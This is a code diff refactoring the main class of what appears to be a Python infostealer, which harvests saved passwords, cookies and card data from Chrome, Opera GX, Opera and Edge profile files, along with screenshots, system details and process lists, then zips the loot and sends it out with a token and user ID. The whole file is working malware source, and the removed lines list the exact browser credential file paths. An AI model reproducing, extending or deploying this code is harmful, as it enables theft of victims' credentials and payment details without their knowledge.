@@ -1,12 +1,12 @@
 from shutil import rmtree
-from getpass import getuser
+from os import path, mkdir
 from threading import Thread
-from os import path, mkdir, environ, sep
 
-from .modules.sender import Sender
+from .utils.sender import Sender
+from .utils.config import MultistealerConfig
+
 from .modules.system import System
-
-from .browsers.chromium import Chromium
+from .modules.chromium import Chromium
 
 
 class Stealer(Thread):
@@ -18,12 +18,9 @@ class Stealer(Thread):
         self.user_id = user_id
         self.errors = errors
 
-        self.user = getuser()
-        self.zip_name = f"{self.user}-st"
-        self.storage_path = f"C:/Users/{self.user}/AppData/"
-        self.storage_folder = "stink/"
+        self.config = MultistealerConfig()
 
-        for status in ["system", "screen", "cookies", "passwords", "processes", "cards"]:
+        for status in self.config.Functions:
 
             if status in kwargs:
                 self.__dict__.update({status: kwargs[status]})
@@ -34,13 +31,9 @@ class Stealer(Thread):
             {
                 "object": Chromium(
                     "Chrome",
-                    self.storage_path,
-                    self.storage_folder,
-                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\Local State",
-                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\Default\Cookies",
-                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\Default\Login Data",
-                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\Default\Web Data",
-                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Google\Chrome\User Data\Default\Network\Cookies",
+                    self.config.StoragePath,
+                    self.config.StorageFolder,
+                    *self.config.ChromePaths,
                     (self.passwords, self.cookies, self.cards),
                     self.errors
                 )
@@ -48,13 +41,9 @@ class Stealer(Thread):
             {
                 "object": Chromium(
                     "Opera GX",
-                    self.storage_path,
-                    self.storage_folder,
-                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera GX Stable\Local State",
-                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera GX Stable\Cookies",
-                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera GX Stable\Login Data",
-                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera GX Stable\Web Data",
-                    "",
+                    self.config.StoragePath,
+                    self.config.StorageFolder,
+                    *self.config.OperaGXPaths,
                     (self.passwords, self.cookies, self.cards),
                     self.errors
                 )
@@ -62,13 +51,9 @@ class Stealer(Thread):
             {
                 "object": Chromium(
                     "Opera Default",
-                    self.storage_path,
-                    self.storage_folder,
-                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera Stable\Local State",
-                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera Stable\Cookies",
-                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera Stable\Login Data",
-                    rf"{environ['USERPROFILE']}{sep}AppData\Roaming\Opera Software\Opera Stable\Web Data",
-                    "",
+                    self.config.StoragePath,
+                    self.config.StorageFolder,
+                    *self.config.OperaDefaultPaths,
                     (self.passwords, self.cookies, self.cards),
                     self.errors
                 )
@@ -76,22 +61,18 @@ class Stealer(Thread):
             {
                 "object": Chromium(
                     "Microsoft Edge",
-                    self.storage_path,
-                    self.storage_folder,
-                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Microsoft\Edge\User Data\Local State",
-                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Microsoft\Edge\User Data\Default\Cookies",
-                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
-                    rf"{environ['USERPROFILE']}{sep}AppData\Local\Microsoft\Edge\User Data\Default\Web Data",
-                    "",
+                    self.config.StoragePath,
+                    self.config.StorageFolder,
+                    *self.config.MicrosoftEdgePaths,
                     (self.passwords, self.cookies, self.cards),
                     self.errors
                 )
             },
             {
                 "object": System(
-                    self.storage_path,
-                    self.storage_folder,
-                    "/System",
+                    self.config.StoragePath,
+                    self.config.StorageFolder,
+                    "System",
                     (self.screen, self.system, self.processes),
                     self.errors
                 )
@@ -100,11 +81,11 @@ class Stealer(Thread):
 
     def __create_storage(self):
 
-        if not path.exists(f"{self.storage_path}{self.storage_folder}"):
-            mkdir(f"{self.storage_path}{self.storage_folder}")
+        if not path.exists(rf"{self.config.StoragePath}\{self.config.StorageFolder}"):
+            mkdir(rf"{self.config.StoragePath}\{self.config.StorageFolder}")
         else:
-            rmtree(f"{self.storage_path}{self.storage_folder}")
-            mkdir(f"{self.storage_path}{self.storage_folder}")
+            rmtree(rf"{self.config.StoragePath}\{self.config.StorageFolder}")
+            mkdir(rf"{self.config.StoragePath}\{self.config.StorageFolder}")
 
     def run(self):
 
@@ -115,7 +96,7 @@ class Stealer(Thread):
             for method in self.methods:
                 method["object"].run()
 
-            Sender(self.zip_name, self.storage_path, self.storage_folder, self.token, self.user_id, self.errors).run()
+            Sender(self.config.ZipName, self.config.StoragePath, self.config.StorageFolder, self.token, self.user_id, self.errors).run()
 
         except Exception as e:
 
